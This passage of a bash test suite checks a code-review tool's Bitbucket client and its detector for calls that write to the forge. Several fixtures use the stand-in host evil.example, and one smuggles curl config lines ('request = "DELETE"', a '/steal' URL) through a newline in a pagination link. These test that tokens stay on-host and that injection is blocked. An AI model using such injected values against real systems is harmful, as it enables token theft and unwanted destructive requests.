bbcase; jq '.next = "https://evil.example/2.0/x?pagelen=100&page=2"' "$tmp/bb-ok/page1.json" > "$tmp/bb-c/page1.json"
check "a next link off api.bitbucket.org prints unknown" unknown "$(runbb "$tmp/bb-c")"
check "and the token is never sent there" 0 "$(grep -c 'evil.example' "$tmp/bb-calls")"
# A next value that embeds a newline and curl config lines passes the host
# prefix; without the control-character guard those lines reach curl -K -.
INJ_NEXT=$'https://api.bitbucket.org/2.0/x"\nrequest = "DELETE"\nurl = "https://evil.example/steal'
bbcase; jq --arg n "$INJ_NEXT" '.next = $n' "$tmp/bb-ok/page1.json" > "$tmp/bb-c/page1.json"
check "a next link carrying a newline and config lines prints unknown" unknown "$(runbb "$tmp/bb-c")"
check "and the injected config never reaches curl" 0 "$(grep -c 'evil.example\|^request = ' "$tmp/bb-calls")"
grep -vF '[[:cntrl:]]' "$tmp/bb.sh" > "$tmp/bb-mut4.sh"
check "M11: the mutation removed the control-character guard" 0 "$(grep -cF '[[:cntrl:]]' "$tmp/bb-mut4.sh")"
check "M11: without the guard the injected config reaches curl" 1 \
    "$(mv "$tmp/bb.sh" "$tmp/bb.sh.real"; cp "$tmp/bb-mut4.sh" "$tmp/bb.sh"; runbb "$tmp/bb-c" >/dev/null; mv "$tmp/bb.sh.real" "$tmp/bb.sh"; grep -c '^request = "DELETE"' "$tmp/bb-calls" | awk '{print ($1 > 0)}')"
check "a missing token prints unknown, with no request made" "unknown 0" "$(o="$(BB_NO_TOKEN=1 runbb "$tmp/bb-ok")"; echo "$o $(grep -c . "$tmp/bb-calls")")"
git -C "$tmp/bbrepo" remote set-url origin https://github.com/acme/app.git
check "an origin that is not Bitbucket prints unknown" unknown "$(runbb "$tmp/bb-ok")"
git -C "$tmp/bbrepo" remote set-url origin https://me@bitbucket.org/acme/app.git
check "an https origin with a user resolves the same slug" "$OUT" "$(runbb "$tmp/bb-ok")"
git -C "$tmp/bbrepo" remote set-url origin git@bitbucket.org:acme/app.git

# Mutations: the size guard, the resolution filter, and the host guard each
# carry an assertion above.
grep -vF 'or ([$pages[].values[]] | length) != $pages[0].size' "$tmp/bb.sh" > "$tmp/bb-mut1.sh"
check "M8: the mutation removed the size guard" 0 "$(grep -cF '!= $pages[0].size' "$tmp/bb-mut1.sh")"
bbfix "$tmp/bb-short" 10
check "M8: without the size guard a short read is not unknown" 1 \
    "$(cp "$tmp/bb-mut1.sh" "$tmp/bb.sh.m"; mv "$tmp/bb.sh" "$tmp/bb.sh.real"; mv "$tmp/bb.sh.m" "$tmp/bb.sh"; r="$(runbb "$tmp/bb-short")"; mv "$tmp/bb.sh.real" "$tmp/bb.sh"; [ "$r" != unknown ] && echo 1 || echo 0)"
sed 's/select(\.r\.resolution == null and /select(/' "$tmp/bb.sh" > "$tmp/bb-mut2.sh"
check "M9: the mutation removed the resolution filter" 0 "$(grep -c 'resolution == null' "$tmp/bb-mut2.sh")"
check "M9: without the resolution filter the id assertion would fail" 1 \
    "$(mv "$tmp/bb.sh" "$tmp/bb.sh.real"; cp "$tmp/bb-mut2.sh" "$tmp/bb.sh"; r="$(runbb "$tmp/bb-ok" | jq -r '[.items[].id] | join(" ")' 2>/dev/null)"; mv "$tmp/bb.sh.real" "$tmp/bb.sh"; [ "$r" != "1 4" ] && echo 1 || echo 0)"
sed 's|https://api.bitbucket.org/2.0/\*) ;;|*) ;;|' "$tmp/bb.sh" > "$tmp/bb-mut3.sh"
check "M10: the mutation removed the host guard" 1 "$(grep -c '^ *case "\$URL" in \*) ;;' "$tmp/bb-mut3.sh")"
check "M10: without the host guard the token is sent off-host" 1 \
    "$(bbcase; jq '.next = "https://evil.example/2.0/x?pagelen=100&page=2"' "$tmp/bb-ok/page1.json" > "$tmp/bb-c/page1.json"; mv "$tmp/bb.sh" "$tmp/bb.sh.real"; cp "$tmp/bb-mut3.sh" "$tmp/bb.sh"; runbb "$tmp/bb-c" >/dev/null; mv "$tmp/bb.sh.real" "$tmp/bb.sh"; grep -c 'evil.example' "$tmp/bb-calls" | awk '{print ($1 > 0)}')"
{ cat "$tmp/bb.sh"; printf '\ngh api repos/x\n'; } > "$tmp/bb-mut5.sh"
check "M12: the mutation planted a gh call in the arm" 1 "$(grep -c '^gh api repos/x$' "$tmp/bb-mut5.sh")"
check "M12: the no-gh-call check fires on a planted gh call" 1 "$(grep -cE '(^|[^[:alnum:]_])gh ' "$tmp/bb-mut5.sh" | awk '{print ($1 > 0)}')"

# -----------------------------------------------------------------------------
section "Step 1's record read, against planted records"

READ="$(block "$R2R" 'disposition=[^ ]+')"
check "the record-read block is found" 1 "$([ -n "$READ" ] && echo 1 || echo 0)"
mkdir -p "$tmp/sidecar/review-responses"
cat > "$tmp/sc-stub.sh" <<STUB
#!/usr/bin/env bash
case "\$1 \$2" in
    "path review-responses") echo "$tmp/sidecar/review-responses" ;;
    *) echo "stub sidecar: unexpected call: \$*" >&2; exit 1 ;;
esac
STUB
printf '%s' "$READ" \
    | sed "s|^SC=\"<this skill's directory>/references/sidecar.sh\"$|SC=\"$tmp/sc-stub.sh\"|" \
    | sed 's|pr-<pr-number>\.md|pr-7.md|' > "$tmp/read.sh"
check "the record-read block's placeholders are substituted" 0 "$(grep -c "<pr-number>\\|<this skill" "$tmp/read.sh")"

cat > "$tmp/sidecar/review-responses/pr-7.md" <<'REC'
# Review responses — PR 7

## Round 1 — 2026-10-02, head abc1234

<!-- round: k=1 head=abc1234abc1234abc1234abc1234abc1234abcd evidence=sub-agent -->

### 1. src/a.ts:4 — https://github.com/acme/app/pull/7#discussion_r1

<!-- thread: id=PRRT_a last-at=2026-10-02T00:00:00Z disposition=open -->

### 2. review summary — u2

<!-- thread: id=PRR_cr last-at=2026-10-04T00:00:00Z disposition=postpone -->

> Quoting a marker inside a comment: <!-- thread: id=PRRT_fake last-at=x disposition=fix -->

## Round 2 — 2026-10-05, head def5678

<!-- thread: id=PRRT_a last-at=2026-10-03T00:00:00Z disposition=push-back -->
<!-- thread: id=PRRT_bad last-at=2026-10-03T00:00:00Z -->
REC
GOT="$(bash "$tmp/read.sh")"
check "the latest round wins per thread, and only exact markers are read" \
    "PRRT_a 2026-10-03T00:00:00Z push-back
PRR_cr 2026-10-04T00:00:00Z postpone" "$GOT"
rm "$tmp/sidecar/review-responses/pr-7.md"
check "no record prints nothing (a first round)" "" "$(bash "$tmp/read.sh")"

# The record above is typed by hand. The one Step 4 tells the agent to write is
# the template, so fill ITS marker line and read that back. The reader treats
# any disposition but the literal `open` as settled; if the template's word for
# an undecided thread drifted, every undecided thread would skip the evidence
# check and nothing else here would notice.
TPL="$(grep -m1 '^<!-- thread: id=<thread-id> last-at=<last_at> disposition=<' "$R2R")"
check "the template's thread marker is found" 1 "$([ -n "$TPL" ] && echo 1 || echo 0)"
TPL_WORDS="$(sed -n 's/.*disposition=<\([^>]*\)>.*/\1/p' <<<"$TPL" | tr '|' '\n' | sort | tr '\n' ' ')"
check "the template names exactly the five disposition words the skill relies on" \
    "answer fix open postpone push-back " "$TPL_WORDS"
check "the settled rule says a disposition other than \`open\` is settled" 1 \
    "$(grep -c 'whose disposition is not `open`, is \*\*settled\*\*' "$R2R" | awk '{print ($1 > 0)}')"
check "an unnamed item is recorded as \`open\`" 1 \
    "$(grep -c 'An item not named is recorded as `open`' "$R2R" | awk '{print ($1 > 0)}')"
{
    printf '# Review responses — PR 7\n\n## Round 1\n\n'
    n=0
    for w in $TPL_WORDS; do
        n=$((n + 1))
        sed -e "s|<thread-id>|T$n|" -e "s|<last_at>|2026-10-0${n}T00:00:00Z|" \
            -e "s|disposition=<[^>]*>|disposition=$w|" <<<"$TPL"
    done
} > "$tmp/sidecar/review-responses/pr-7.md"
check "every filled template marker is read, with the word it carries" \
    "T1 2026-10-01T00:00:00Z answer
T2 2026-10-02T00:00:00Z fix
T3 2026-10-03T00:00:00Z open
T4 2026-10-04T00:00:00Z postpone
T5 2026-10-05T00:00:00Z push-back" "$(bash "$tmp/read.sh")"
# Mutation: a template that spells the undecided word differently is caught.
sed 's/disposition=<fix|push-back|postpone|answer|open>/disposition=<fix|push-back|postpone|answer|undecided>/' "$R2R" > "$tmp/r2r-mut.md"
MUT_WORDS="$(grep -m1 '^<!-- thread: id=<thread-id>' "$tmp/r2r-mut.md" | sed -n 's/.*disposition=<\([^>]*\)>.*/\1/p' | tr '|' '\n' | sort | tr '\n' ' ')"
check "M7: a renamed undecided word fails the five-word pin" 1 \
    "$([ "$MUT_WORDS" != "answer fix open postpone push-back " ] && echo 1 || echo 0)"
rm "$tmp/sidecar/review-responses/pr-7.md"

# -----------------------------------------------------------------------------
section "the Review-Thread trailer, written by /fix-findings and read by /respond-to-review"

check "/fix-findings Step 1 tells its fixer to write 'Review-Thread: <url>'" 1 \
    "$(grep -c 'carries `Review-Thread: <url>`' "$FF" | awk '{print ($1 > 0)}')"
check "/fix-findings puts the trailer above Fix-Findings-Run, which stays the last line" 1 \
    "$(grep -c 'the line just above it' "$FF" | awk '{print ($1 > 0)}')"
LOGREAD="$(block "$R2R" '^Review-Thread: ')"
check "the log-read block reads the same trailer string" 1 "$(grep -c "/^Review-Thread: /" <<<"$LOGREAD")"

g="$tmp/repo"
git init -q "$g"
git -C "$g" commit -q --allow-empty -m base
git -C "$g" branch -q basebr
git -C "$g" commit -q --allow-empty -m "Guard the empty list

commit.notasha in a body line must not be read as a commit
Review-Thread: https://github.com/acme/app/pull/7#discussion_r1
Fix-Findings-Run: 20261027T000000Z"
want_sha="$(git -C "$g" log -1 --format=%h)"
git -C "$g" commit -q --allow-empty -m "unrelated"
cat > "$tmp/sc-base.sh" <<'STUB'
#!/usr/bin/env bash
[ "$1" = base-ref ] && { echo basebr; exit 0; }
echo "stub sidecar: unexpected call: $*" >&2; exit 1
STUB
printf '%s' "$LOGREAD" | sed "s|^SC=\"<this skill's directory>/references/sidecar.sh\"$|SC=\"$tmp/sc-base.sh\"|" > "$tmp/log.sh"
got="$(cd "$g" && bash "$tmp/log.sh")"
# The planted body line starting with "commit." is the case the 47-character
# hex match exists for: a looser match would take it as the commit and
# attribute the trailer to a SHA that does not exist.
check "the log read names the fix commit and its thread" \
    "$want_sha https://github.com/acme/app/pull/7#discussion_r1" \
    "$(awk -v s="$want_sha" '$1 == s' <<<"$got")"

sed 's/length($0) == 47 \&\& \/\^commit\\.\[0-9a-f\]+\$\//\/^commit\\.\//' "$tmp/log.sh" > "$tmp/log-mut.sh"
check "M5: the mutation loosened the commit match" 0 "$(grep -c 'length(\$0) == 47' "$tmp/log-mut.sh")"
check "M5: with a loose match the trailer is attributed to a body line, not the commit" 1 \
    "$([ "$(cd "$g" && bash "$tmp/log-mut.sh" | awk -v s="$want_sha" '$1 == s')" = "" ] && echo 1 || echo 0)"

# -----------------------------------------------------------------------------
section "never posts, never mutates, never writes the record by hand"

# posts <file> — print each forge-writing call in the file's fenced blocks.
# Backslash continuations are joined first so a flag on a later line is seen.
# Three shapes beyond the plain verbs: any `gh api` that is not a graphql call
# yet carries a field flag (a field makes it a POST), any --method/-X write
# (`--method=POST` included), and any `mutation` keyword whatever follows it.
# The skill's own Step 1 fetch is `gh api graphql ... -f query='query(...)'`,
# which the graphql exclusion keeps silent.
posts() {
    awk '/^ *```/ { on = !on; next } on' "$1" \
        | awk '{ if (sub(/\\$/, "")) { acc = acc $0 } else { print acc $0; acc = "" } }' \
        | grep -niE 'gh +(pr|issue) +(comment|review|edit|close|merge)|(-X|--method)[ =]*(POST|PATCH|PUT|DELETE)|(^|[^[:alnum:]_])mutation([^[:alnum:]_]|$)|resolveReviewThread|addPullRequestReview|addComment|addPullRequestReviewThreadReply' || true
    awk '/^ *```/ { on = !on; next } on' "$1" \
        | awk '{ if (sub(/\\$/, "")) { acc = acc $0 } else { print acc $0; acc = "" } }' \
        | grep -E 'gh +api ' | grep -vE 'gh +api +([^ ]+ +)*graphql( |$)' \
        | grep -E '(^| )(-f|-F|--field|--raw-field)([ =]|[^ -])' || true
    # curl, which the Bitbucket arm runs: a body flag on the command line, a
    # -X/--request that names any method but GET, or a request/data key in the
    # config it reads on stdin, makes a request a write. curl's config file
    # (man curl, -K/--config) takes `key = value`, `key=value`, `key: value` and
    # `key value`, quoted or not, so the key match accepts all four after a line
    # start or a printf \n; the quoted `key = "` form is also kept mid-line.
    awk '/^ *```/ { on = !on; next } on' "$1" \
        | awk '{ if (sub(/\\$/, "")) { acc = acc $0 } else { print acc $0; acc = "" } }' \
        | grep -nE '(^|[^[:alnum:]_])curl( |.* )(-d|--data[a-z-]*|--json|-F|--form[a-z-]*|-T|--upload-file)([ =]|$)|(^|[^[:alnum:]_-]|\\n)(request|data|data-[a-z]+|json|form|upload-file) *= *"|(^[[:space:]]*|\\n)(request|data|data-[a-z]+|json|form|form-[a-z]+|upload-file) *([=:]| ) *[^[:space:]=:]' || true
    awk '/^ *```/ { on = !on; next } on' "$1" \
        | awk '{ if (sub(/\\$/, "")) { acc = acc $0 } else { print acc $0; acc = "" } }' \
        | grep -nE '(^|[^[:alnum:]_])curl( |.* )(-[A-Za-z]*X|--request)([ =]|[A-Z])' \
        | grep -vE '(-[A-Za-z]*X|--request)[ =]*["'"'"']?GET(["'"'"'[:space:]]|$)' || true
}
check "no fenced block in /respond-to-review writes to the forge" "" "$(posts "$R2R")"
cp "$R2R" "$tmp/planted.md"
printf '\n```bash\ngh pr comment 7 --body-file reply.md\n```\n' >> "$tmp/planted.md"
check "M3: the detector fires on a planted gh pr comment" 1 "$(posts "$tmp/planted.md" | grep -c .)"
cp "$R2R" "$tmp/planted2.md"
printf '\n```bash\ngh api graphql -f query='"'"'mutation { resolveReviewThread(input: {threadId: "x"}) { thread { id } } }'"'"'\n```\n' >> "$tmp/planted2.md"
check "M4: the detector fires on a planted resolve mutation" 1 "$(posts "$tmp/planted2.md" | grep -c . | awk '{print ($1 > 0)}')"

# Renamed shapes of the same forbidden act, none of which the verbs above name.
plant() { cp "$R2R" "$tmp/$1.md"; printf '\n```bash\n%s\n```\n' "$2" >> "$tmp/$1.md"; }
plant p-field 'gh api repos/o/r/pulls/7/comments/1/replies -f body="done"'
plant p-capf 'gh api -F body=@reply.md repos/o/r/issues/7/comments'
plant p-cont 'gh api repos/o/r/pulls/7/comments/1/replies \
  --raw-field body="done"'
plant p-eq 'gh api --method=POST repos/o/r/issues/7/comments'
plant p-named 'gh api graphql -f query='"'"'mutation Reply($id: ID!) { addComment(input: {subjectId: $id, body: "x"}) { clientMutationId } }'"'"''
plant p-curl-data 'curl -sS -K - --data '"'"'{"content":{"raw":"done"}}'"'"' "$API/comments"'
plant p-curl-cfg 'printf '"'"'%s\nrequest = "POST"\nurl = "%s"\n'"'"' "$bb_auth" "$1" | curl -sS -K -'
plant p-curl-del 'curl -sS --request DELETE "$u"'
plant p-curl-eq 'curl --request=DELETE "$u"'
plant p-curl-bare 'printf '"'"'%s\nrequest = POST\nurl = "%s"\n'"'"' "$bb_auth" "$1" | curl -sS -K -'
plant p-curl-colon 'printf '"'"'%s\nrequest: POST\n'"'"' "$bb_auth" | curl -sS -K -'
plant p-curl-json 'curl -sS --json @reply.json "$API/comments"'
for c in p-field p-capf p-cont p-eq p-named p-curl-data p-curl-cfg p-curl-del p-curl-eq p-curl-bare p-curl-colon p-curl-json; do
    check "M6: the detector fires on planted shape $c" 1 "$(posts "$tmp/$c.md" | grep -c . | awk '{print ($1 > 0)}')"
done

check "no fenced block inlines a sidecar path" 0 \
    "$(awk '/^ *```/ { on = !on; next } on' "$R2R" | grep -c '\.claude/sidecars')"
WRITE="$(block "$R2R" '"$SC" commit')"
check "the record is written to sidecar.sh's review-responses path" 1 "$(grep -c 'path review-responses' <<<"$WRITE")"
check "the record is committed through sidecar.sh commit" 1 "$(grep -c '"\$SC" commit --' <<<"$WRITE")"

# -----------------------------------------------------------------------------
section "routes and bundles"

section "Step 2's Bitbucket diff block (#612): the PR's own two branches, never an empty diff"

DIFFB="$(block "$R2R" 'git diff "$BASE_REF...origin/$SRC"')"
check "the Bitbucket diff block is found" 1 "$([ -n "$DIFFB" ] && echo 1 || echo 0)"
printf '%s' "$DIFFB" | sed 's/^PR=<pr-number>$/PR=7/' > "$tmp/bbdiff.sh"
check "the Bitbucket diff block's PR placeholder is substituted" 1 "$(grep -cx 'PR=7' "$tmp/bbdiff.sh")"
check "the Bitbucket diff block reads no variable an earlier block set" 0 \
    "$(grep -c 'BASE_REF:-\|BASE_BRANCH' "$tmp/bbdiff.sh")"

# A real remote the block can fetch from: main, and feat with one added file.
# Its path carries bitbucket.org/acme/app so the block's slug sed reads it.
BBREMOTE="$tmp/bitbucket.org/acme/app.git"
rm -rf "$tmp/bitbucket.org" "$tmp/bbseed"; mkdir -p "$tmp/bitbucket.org/acme"; git init -q --bare "$BBREMOTE"
git init -q "$tmp/bbseed"; git -C "$tmp/bbseed" checkout -q -b main
git -C "$tmp/bbseed" commit -q --allow-empty -m base
git -C "$tmp/bbseed" checkout -q -b feat
echo hello > "$tmp/bbseed/added.txt"; git -C "$tmp/bbseed" add added.txt; git -C "$tmp/bbseed" commit -q -m feat
git -C "$tmp/bbseed" push -q "$BBREMOTE" main feat
git -C "$tmp/bbrepo" remote set-url origin "$BBREMOTE"

# runbbdiff <fixture-dir> — HEAD in bbrepo is its own unrelated commit, so a diff
# that reads HEAD (or an unset BASE_REF) would be empty or wrong.
runbbdiff() {
    : > "$tmp/bb-calls"
    (cd "$tmp/bbrepo" && env -u BITBUCKET_EMAIL -u BASE_REF BB_FX="$1" BB_CALLS="$tmp/bb-calls" PATH="$tmp/bbbin:$PATH" \
        BITBUCKET_TOKEN="${BB_TOK-s3cr3t-token}" bash "$tmp/bbdiff.sh" 2>"$tmp/bbdiff.err"; echo "exit=$?")
}
DOUT="$(runbbdiff "$tmp/bb-ok")"
check "it prints the PR's own diff, from the remote branches, without the PR branch checked out" 1 \
    "$(grep -c '^+hello$' <<<"$DOUT")"
check "and exits 0" 1 "$(grep -cx 'exit=0' <<<"$DOUT")"
bbcase; jq 'del(.destination)' "$tmp/bb-ok/pr.json" > "$tmp/bb-c/pr.json"
DOUT="$(runbbdiff "$tmp/bb-c")"
check "a PR with no destination branch prints nothing and exits nonzero, not an empty diff" "exit=1" "$DOUT"
bbcase; jq '.source.branch.name = ""' "$tmp/bb-ok/pr.json" > "$tmp/bb-c/pr.json"
check "an empty source branch name prints nothing and exits nonzero" "exit=1" "$(runbbdiff "$tmp/bb-c")"
bbcase; jq '.source.branch.name = "gone"' "$tmp/bb-ok/pr.json" > "$tmp/bb-c/pr.json"
check "a branch that cannot be fetched prints nothing and exits nonzero" "exit=1" "$(runbbdiff "$tmp/bb-c")"
check "a missing token prints nothing and exits nonzero" "exit=1" "$(BB_TOK='' runbbdiff "$tmp/bb-ok")"
check "the diff block's every request is a plain GET" 0 "$(grep -ciE '^(ARGV .*(^| )(-[A-Za-z]*X|--request|-d|--data[a-z-]*|--json|-F|--form[a-z-]*|-T|--upload-file)([ =]|$)|(request|data|data-[a-z]+|form|form-[a-z]+|json|upload-file) *([=:]| ))' "$tmp/bb-calls")"
git -C "$tmp/bbrepo" remote set-url origin git@bitbucket.org:acme/app.git

for b in docs/comment-craft.md docs/next-step-menu.md init-pipeline/scripts/sidecar.sh; do
    check "the manifest bundles $b into respond-to-review" 1 \
        "$(awk -v s="$b" '$1 == s && $2 == "respond-to-review"' "$MANIFEST" | grep -c .)"
done
check "/fix-findings' Inputs name /respond-to-review as a source" 1 \
    "$(awk '/^## Inputs/ { on = 1; next } /^## / { on = 0 } on' "$FF" | grep -c '/respond-to-review' | awk '{print ($1 > 0)}')"
check "/closeout Step 2 routes failed review to /respond-to-review" 1 \
    "$(awk '/^### 2\./ { on = 1; next } /^### 3\./ { on = 0 } on' "$CO" | grep -c '/respond-to-review' | awk '{print ($1 > 0)}')"
check "/help row 1 recommends /respond-to-review on CHANGES_REQUESTED" 1 \
    "$(grep -E '^\| 1 \|' "$HELP" | grep -c 'CHANGES_REQUESTED.*/respond-to-review')"
check "/help gathers reviewDecision, which row 1 reads" 1 \
    "$(grep -c 'gh pr list .*reviewDecision' "$HELP" | awk '{print ($1 > 0)}')"

printf '\n%s passed, %s failed\n' "$pass" "$fail"
[ "$fail" -eq 0 ]
